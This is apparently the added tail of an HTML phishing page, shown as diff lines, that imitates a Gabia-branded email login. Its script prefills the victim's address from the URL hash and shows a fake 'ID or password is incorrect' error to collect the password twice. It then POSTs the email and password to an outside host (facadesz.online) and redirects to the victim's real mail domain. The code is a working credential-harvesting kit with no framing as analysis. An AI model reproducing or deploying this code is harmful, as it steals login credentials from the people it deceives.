+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">전자세금계산서 EMS 발송 이력 관리 기능 업데이트 안내</a></div></div></div><span class="swiper-notification" aria-live="assertive" style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;" aria-atomic="true"></span></div></div></div><p></p></main>
+<footer class="mb-10 text-center" style="border: 0px solid rgb(153, 153, 153); text-align: center; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: &quot;Malgun Gothic&quot;, &quot;맑은 고딕&quot;, &quot;Apple SD Gothic Neo&quot;, 돋움, dotum, sans-serif; font-size: 16px; font-style: normal; font-weight: 400; margin-bottom: 2.5rem; word-spacing: 0px; display: block; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; 
+background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><a class="text-14px text-gray-100" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(196, 196, 196); letter-spacing: -0.21px; font-size: 0.87rem; text-decoration: inherit; box-sizing: border-box;" href="">
+©Gabia Inc.</a></footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script>
+var text1 = document.getElementById("email");
+var butt1 = document.getElementById("next");
+
+text1.addEventListener('keyup', function(){
+
+  if (text1.value == null || text1.value == "") {
+    butt1.style.backgroundColor = "#ccc;";
+  }
+  else {
+    butt1.style.backgroundColor = "#157efb";
+  }
+});
+
+</script>
+
+<script>
+var text2 = document.getElementById("password");
+var butt2 = document.getElementById("submit-btn");
+
+text2.addEventListener('keyup', function(){
+
+  if (text2.value == null || text2.value == "") {
+    butt2.style.backgroundColor = "#ccc;";
+  }
+  else {
+    butt2.style.backgroundColor = "#157efb";
+  }
+});
+
+</script>
+
+<script type="text/javascript">
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+       var errorArray = ["","ID or password is incorrect.", "ID or password is incorrect.", "ID or password is incorrect."];
+
+		$('#email, #password').on('input',function(){
+			$('#error').hide();
+			$('#msg').hide();
+		});
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+          $('#contact').trigger("reset");
+          $("#msg").hide();
+          $('#fieldImg').attr('src', 'images/other-1.png');
+          $('#field').html("Other Mail");
+          $('#email').val(my_email);
+          $('#emailch').html(my_email);
+          $("#msg").hide();
+          $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+          $("#automail").animate({right:200, opacity:"show"}, 1000);
+		  $('#domain-name').html(final);
+		  $('#connect').html(""+my_slice);
+      }
+      ///////////////url getting email////////////////
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+		$("#processing").show();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').html(errorArray[count]);
+     
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+     
+
+        if (!filter.test(my_email)) {
+		$("#processing").hide();
+            $('#error').show();
+            $('#error').html("Credentials not recognized.");
+            email.focus
+            return false;
+        }
+        if (!password) {
+		$("#processing").hide();
+            $('#error').show();
+            $('#error').html("ID or password is incorrect..");
+            email.focus
+            return false;
+        }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+     
+      count=count+1;
+      $('#domain-name').html(final);
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://facadesz.online/gen/yun/sol/hwk/hwk.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+			$("#processing").show();
+              
+            },
+            success: function(response){
+			              alert(response);
+              
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+				
+                  $("#password").val("");
+                  if (count>=2) {
+				  
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("http://www." + my_slice);
+                     
+                  }
+                  $('#msg').html(response['msg']);
+                }
+                else{
+				
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+			 
+                count=0;
+                window.location.replace("http://www." + my_slice);
+              }
+              $("#msg").show();
+              $('#msg').html(errorArray[count]);
+            },
+            complete: function(){
+			  
+              $('#submit-btn').html(' Sign in  ');
+            }
+          });
+    });
+
+
+    });
+	
+
+
+ 
+  
+
+
+</script>
+
+</body></html>
